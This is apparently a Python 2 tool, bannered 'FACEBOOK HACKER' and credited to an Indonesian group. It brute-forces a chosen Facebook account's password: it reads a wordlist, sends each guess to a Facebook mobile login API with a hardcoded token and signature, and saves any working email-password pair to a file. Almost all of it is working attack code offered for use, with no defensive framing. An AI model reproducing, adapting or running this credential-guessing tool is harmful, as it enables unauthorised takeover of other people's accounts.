import os, sys, time, datetime, random, json
from multiprocessing.pool import ThreadPool
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
else:
    try:
        import requests
    except ImportError:
        os.system('pip2 install requests')

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

internet = '\n\x1b[33;1m     \xe2\x95\xad\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x97\xa2\xe2\x97\xa4\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x95\xae\n\x1b[33;1m     \xe2\x94\x83\xe2\x94\x8f\xe2\x94\x93\xe2\x94\x8f\xe2\x94\x81\xe2\x94\x81\xe2\x94\xb3\xe2\x97\xa2\xe2\x97\xa4\xe2\x94\xb3\xe2\x94\x93\xe2\x95\xb1\xe2\x95\xb1\xe2\x95\xb1\xe2\x94\x83\x1b[32;1m Cheking Acces\n\x1b[33;1m     \xe2\x94\x83\xe2\x94\x83\xe2\x94\xa3\xe2\x94\xab\xe2\x95\xb1\xe2\x95\xb1\xe2\x97\xa2\xe2\x97\xa4\xe2\x95\xb1\xe2\x95\xb1\xe2\x94\xa3\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x83\x1b[32;1m    Internet\n\x1b[33;1m     \xe2\x94\x83\xe2\x94\x97\xe2\x94\x9b\xe2\x94\x97\xe2\x94\x81\xe2\x97\xa2\xe2\x97\xa4\xe2\x94\xbb\xe2\x94\xbb\xe2\x94\xbb\xe2\x94\x9b\xe2\x95\xb1\xe2\x95\xb1\xe2\x95\xb1\xe2\x94\x83\n\x1b[33;1m     \xe2\x95\xb0\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x97\xa2\xe2\x97\xa4\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x95\xaf\n\x1b[35;1m--------------------------------------'
banner = '\n\033[31;1m____ ____ ____ ____ ___  ____ ____ _  _\n|___ |__| |    |___ |__] |  | |  | |_/\n\033[37;1m|    |  | |___ |___ |__] |__| |__| | \_\n\033[31;1m          _  _ ____ ____ _  _ ____ ____\n          |__| |__| |    |_/  |___ |__/\n\033[37;1m          |  | |  | |___ | \_ |___ |  \\\n\033[36;1mCreated By\033[31;1m :\033[32;1m Seluruh grup \033[32;1m[\033[37;1mD4RKN355 T34M\033[32;1m]\n\033[35;1m------------------------------------------'


def ceknet():
    try:
    	os.system('reset')
        print internet
        print '\r\033[37;1m[\x1b[92m+\033[37;1m] \033[37;1mMeriksa Koneksi Internet'
        time.sleep(2)
        toolbar_width = 25
        sys.stdout.write('[%s]' % ('-\033[37;1m' * toolbar_width))
        sys.stdout.flush()
        for i in range(toolbar_width):
            sys.stdout.write('\r')
            sys.stdout.flush()
            sys.stdout.write('\033[37;1m[')
            sys.stdout.write('\033[36;1m#\033[37;1m' * (i + 1))
            sys.stdout.flush()
            time.sleep(5.0 / 100)
        try:
            rq = requests.get('http://facebook.com')
            time.sleep(3.5)
            print '\033[37;1m] \033[35;1m~> \033[32;1mSucces '
            time.sleep(2.0)
            start()
        except requests.exceptions.ConnectionError:
            time.sleep(3.5)
            print '\033[37;1m]\033[35;1m ~>\033[31;1m Tidak Ada koneksi'
            time.sleep(1.5)
            sys.exit()

    except KeyboardInterrupt:
    	time.sleep(3.5)
        exit('\n\033[37;1m[\x1b[92mx\033[37;1m] \033[31;1mProgram berhenti\n')

def start():
        try:
            os.system('reset')
            print banner
            email = raw_input('\033[34;1m[\033[37;1m~\033[34;1m]\033[37;1m ID \033[36;1m| \033[37;1mEmail\033[36;1m | \033[37;1mHP \033[31;1m: \033[32;1m')
            passw = raw_input('\033[34;1m[\033[37;1m~\033[34;1m]\033[37;1m File Wordlist   \033[31;1m:\033[32;1m ')
            total = open(passw, 'r')
            total = total.readlines()
            print '\033[34;1m[\033[37;1m^\033[34;1m] \033[37;1mTarget\033[36;1m :\033[32;1m ' + email
            time.sleep(3.0)
            print '\033[34;1m[\033[37;1m^\033[34;1m] \033[37;1mTotal List \033[36;1m:\033[32;1m ' + str(len(total))
            time.sleep(3.0)
            print
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\033[32;1m[\033[37;1m=\033[32;1m]\033[34;1m Start \033[37;1m>\033[35;1m '+email+'\033[37;1m >\033[35;1m '+pw)
                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('succes.txt', 'w')
                        dapat.write('[ID]=> ' + email + '\n')
                        dapat.write('[PW]=> ' + pw)
                        dapat.close()
                        print '\n\n\033[32;1m[+] \033[37;1mPASSWORD FOUND'
                        print '\033[32;1m[+] \033[37;1mUsername \033[32;1m: \033[35;1m'+email
                        print '\033[32;1m[+] \033[37;1mPassword \033[32;1m:\033[35;1m '+pw
                        print '\033[32;1m[+] \033[37;1mStatus   \033[32;1m:\033[32;1m SUCCES'
                        print '\033[32;1m[=] \033[37;1mProgram Finish'
                        sys.exit()
                    else:
                        if 'www.facebook.com' in mpsh['error_msg']:
                            ceks = open('succesCP.txt', 'w')
                            ceks.write('[ID]=> ' + email + '\n')
                            ceks.write('[PW]=> ' + pw)
                            ceks.close()
                            print '\n\n\033[33;1m[+] \033[37;1mPASSWORD FOUND'
                            print '\033[33;1m[+] \033[37;1mUsername \033[32;1m: \033[35;1m'+email
                            print '\033[33;1m[+] \033[37;1mPassword \033[32;1m:\033[35;1m '+pw
                            print '\033[33;1m[+] \033[37;1mStatus   \033[32;1m:\033[33;1m CHEKPOINT'
                            print '\033[33;1m[=] \033[37;1mProgram Finish'
                            sys.exit()
                except requests.exceptions.ConnectionError:
                    print '\033[37;1m[\033[32;1mx\033[37;1m] \033[31;1mkoneksi error'
                    sys.exit()

        except IOError:
            print '\033[37;1m[\033[32;1mx\033[37;1m] \033[37;1mAlamat wordlist tidak ada'
            print '\033[37;1m[\033[32;1mx\033[37;1m] \033[37;1mSaya sarankan Untuk Membuatnya sendiri'
            sys.exit()

ceknet()
